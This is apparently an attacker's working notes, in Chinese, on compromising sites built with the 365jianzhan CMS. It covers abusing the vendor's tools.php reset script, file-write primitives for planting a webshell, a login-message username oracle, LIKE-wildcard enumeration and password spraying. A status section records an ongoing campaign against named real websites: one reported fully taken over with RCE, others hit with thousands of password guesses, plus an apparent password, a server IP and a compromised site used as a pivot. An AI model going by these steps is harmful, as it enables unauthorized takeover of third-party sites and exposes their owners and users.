# 密码恢复链：官方 tools.php + 用户枚举面

## 1. 官方重置机制（bbs.365jz.com/thread-2555）

- 官方公告《365建站器服务器配置中管理员密码忘记的解决办法》：
  1. 获取官方 `tools.php`（工具 2023-02-18 升级，支持最新版）
  2. 上传到站点根目录的 `plugins/` 文件夹
  3. 访问 `http://域名/plugins/tools.php` → 按表单重置管理员密码
  4. 官方提示：恢复后删除该文件
- monroe 后台登录页 "忘记密码>>" 的链接就指向该帖——本族**没有在线找回接口**，恢复途径 = 上传工具。全族通用（同代码底座）。

## 2. tools.php 逻辑（重建版要点）

- 引导同族 bootstrap：`data/core.cache.php` → `source/class/request.class.php` → `data/config.global.php` → `source/include/jzautoload.php` → `source/function/function_core.php`，随后 `new jzmysql(false)`
- 重置：`UPDATE tablepre__admin SET pwd='<substr(md5(pwd),5,20)>' WHERE userid='...'`（与 userlogin 哈希一致）；用户不存在则 INSERT 新管理员
- 交互面：列出已有管理员 + POST `dopost=reset&userid=&pwd=`

## 3. 触发条件 = 文件写入点（已实证解决）

**已验证的写入原语**（scjzgc 全链打通，详见 backend-rce-chain.md）：
- 后台 `file_manage_control.php` `fmdo=edit` — 任意内容写入（唯一过滤 `str_replace("..","")`），写 /plugins/*.php 直接执行
- `lockfile` 参数 — 路径可控写入（内容不可控=时间戳）→ 写马不可行（monroe 实测）
候选及状态（2026-09 实测）：
- UEditor ✗（需后台 session）· INTO DUMPFILE ✗ · FTP ✗（puredb 损坏）· 888 ✗ · install ✗
- **未穷尽（未验证）**：评论/投稿附件、插件自带上传、已控站→目标的跳板侧写入

## 4. 用户枚举面

- 存在性 oracle：`你的密码错误!`=存在 / `你的用户名不存在!`=不存在（对照组各一发，别只看状态码/长度）
- LIKE 通配符枚举：查询 `userid LIKE '<输入>'`，过滤保留 `_`；n 个下划线 = 枚举"是否存在 n 字符用户名"；`%` 被过滤；LIMIT 0,1 只显第一个匹配（逐字符枚举价值有限）

## 5. 独立盘 tools.php 急诊箱（2026-09-22）
- 大量 `365jianzhan222` 站 `/plugins/tools.php?action=setadmin` **GET 可列管理员**（addmin 簇实测 590+）。
- **POST 重置系统性失败**：`Table 'DB.ZZ_admin' doesn't exist`（前缀被弄成大写 `ZZ_`，Linux 大小写敏感）。GET 列表正常说明 SELECT 路径前缀正确，POST 重置路径有 bug。
- 抽样 30+ 站全 ZZ_ → **别再空耗官方 tools 重置**；拿到写点后应上传**自建修复版**（`tablepre__`/`zz_` 小写）而非依赖站上这份。

## 6. 当前实战状态（2026-09）

- **scjzgc（www.scjzgc.cn）：已完全接管** — tools.php 修复版跑通 → 重置 admin → 带 `365aixue` cookie 登录（1976 站后台）→ file_manage_control `fmdo=edit` 写马 → RCE ✅
- **monroe（www.monroediary.com）：admin7799 未破**（~5400 候选全灭，含 scjzgc 密码复用）；LIKE oracle 单管理员；前台免登录插件三连已建立 zz_pluginvar 读+写原语（见 plugin-attack-surface.md），admin 哈希仍读不出（`(select` 墙）
- **weihuaglass / 588kszy（365jianzhan222）**：tools GET 列 addmin/admin 活；POST ZZ_admin 死；同盘 soft 喷常见密全 BAD（2026-09-23，~374×12）
- **czsdwgg**：fha30fhg；稀有盘 107.148.230.244
- 次选方向：**真 CE → safe.txt 毒化**（`references/independent-station-rce.md`）；XSS 收 PHPSESSID；有写点再 FIXED tools；**禁再扩弱口令表**

## 7. 官方 tools 获取坑（2026-09-23）
- bbs.365jz.com/thread-2555 附件（aid≈468）常 **登录墙**；SCJ 跳板 `file_get_contents` 拉到的也可能是登录 HTML（无 `<?php`）
- soft.365jz.com/docs 关键词扫「tools/急诊/密码」未必直接出下载链；uploads/down 路径 404 常见
- 有写点时优先投 **自建 FIXED**（小写 `zz_`/`$tablepre`，勿 strtoupper 表名），不要赌站上存量 buggy tools
